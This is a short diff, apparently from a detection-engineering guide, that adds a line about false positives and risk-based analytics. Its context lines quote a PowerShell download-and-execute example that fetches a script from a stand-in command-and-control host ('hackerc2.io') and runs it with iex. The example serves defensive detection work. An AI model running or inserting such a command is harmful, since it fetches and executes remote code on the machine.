@@ -46,3 +46,4 @@ $request = invoke-webrequest "hackerc2.io/hackerscript"
 iex $request
 
 In summary, detection should account for all variations of execution and downloads in any order. This type of alert does not account for obfuscation and it is easier to create a second custom detection.
+Also there may be false positives from an alert if some deployments leverage this structure. Therefore, risk based analytics can be used to reduce false positives and filter out true positives.
